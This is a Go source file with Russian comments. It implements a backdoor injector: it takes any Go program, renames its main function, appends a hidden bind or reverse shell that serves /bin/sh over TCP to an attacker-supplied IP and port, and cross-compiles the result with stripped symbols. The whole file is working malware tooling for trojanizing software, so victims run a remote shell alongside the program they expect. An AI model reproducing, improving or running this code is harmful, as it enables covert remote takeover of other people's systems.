package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
	// Открытие оригинального файла
	original_file, err := os.OpenFile(file_path, os.O_RDWR|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", file_path, err.Error())
		return
	}
	defer original_file.Close()

	lines := []string{}
	imports := []string{}
	new_imports := []string{}
	var isImportSection bool

	// Создание сканера для построчного чтения файла
	scanner := bufio.NewScanner(original_file)

	for scanner.Scan() {
		line := scanner.Text()

		// Изменение имени исходной функции main
		if strings.HasPrefix(line, "func main") {
			line = strings.Replace(line, "func main", "func main_payload", 1)
			fmt.Println("main found and replaced.")
		}

		// Проверяем, начинаем ли мы секцию импорта
		if strings.HasPrefix(line, "import (") {
			isImportSection = true
		}

		// Если мы находимся в секции импорта, собираем импорты
		if isImportSection {
			if strings.TrimSpace(line) == ")" {
				isImportSection = false
			} else {
				imports = append(imports, strings.TrimSpace(line))
			}
		}

		lines = append(lines, line)
	}

	/*
		if err := scanner.Err(); err != nil {
			fmt.Println("Scanning error!")
			return
		}
	*/
	fmt.Println(len(lines))

	// Проверка и добавление необходимых импортов
	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
	for _, reqImport := range requiredImports {
		if !isImportContains(imports, reqImport) {
			new_imports = append(new_imports, reqImport)
			fmt.Printf("Импорт %s добавлен.\n", reqImport)
		}
	}

	// Обновляем секцию импорта в строках
	if len(new_imports) > 0 {
		lines = updateImports(lines, new_imports)
	}

	err = os.WriteFile("result.go", []byte(strings.Join(lines, "\n")), 0644)

	new_file, err := os.OpenFile("result.go", os.O_RDWR|os.O_APPEND, 0644)
	if err != nil {
		fmt.Printf("[BindShell] Can't open file %s with error: %s\n", new_file.Name(), err.Error())
		return
	}
	defer new_file.Close()

	// Инициализация строки с инъекцией
	BS_string := ""

	// Заполнение строки с инъекцией
	switch shell_type {
	case "bind":
		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_listener, _ := net.Listen(\"tcp\", \":%d\")\n\tfor {\n\t\tBS_conn, _ := BS_listener.Accept()\n\t\tgo bs_handle(BS_conn)\n\t}\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, port)
	case "reverse":
		BS_string = fmt.Sprintf("\n\nfunc bs_handle(BS_conn net.Conn) {\n\tBS_conn.Write([]byte(\"%s\"))\n\tcmd := exec.Command(\"/bin/sh\")\n\trp, wp := io.Pipe()\n\tcmd.Stdin = BS_conn\n\tcmd.Stdout = wp\n\tgo io.Copy(BS_conn, rp)\n\tcmd.Run()\n\tBS_conn.Close()\n}\n\nfunc bs_payload() {\n\tBS_conn, _ := net.Dial(\"tcp\", \"%s:%d\")\n\tbs_handle(BS_conn)\n}\n\nfunc main() {\n\tgo bs_payload()\n\tmain_payload()\n}", OS, ip, port)
	default:
		fmt.Println("[BindShell] Incorrect shell type!")
		return
	}

	// Добавление инъекции в файл
	if _, err := new_file.WriteString(BS_string); err != nil {
		fmt.Println("[BindShell] Can't modify file!")
		return
	}

	// Компиляция файла
	// Сохранение прежних значений переменных среды
	old_GOOS := os.Getenv("GOOS")
	old_GOARCH := os.Getenv("GOARCH")

	// Замена переменной окружения GOOS на целевую ОС
	err = os.Setenv("GOOS", OS)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOOS!", err)
		return
	}

	// Замена переменной окружения ARCHOS на целевую архитектуру
	err = os.Setenv("GOARCH", Arch)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOARCH!", err)
		return
	}

	// Компиляция файла
	cmd := exec.Command("go", "build", "-o", shell_type, "-ldflags", "-w -s", "result.go")
	if err := cmd.Run(); err != nil {
		fmt.Println("[BindShell] Compilation error!", err)
		return
	}

	// Замена переменной окружения GOOS на исходную ОС
	err = os.Setenv("GOOS", old_GOOS)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOOS!", err)
		return
	}

	// Замена переменной окружения ARCHOS на исходную архитектуру
	err = os.Setenv("GOARCH", old_GOARCH)
	if err != nil {
		fmt.Println("[BindShell] Can't change GOARCH!", err)
		return
	}

	fmt.Println("[BindShell] File successfully compiled.")
}
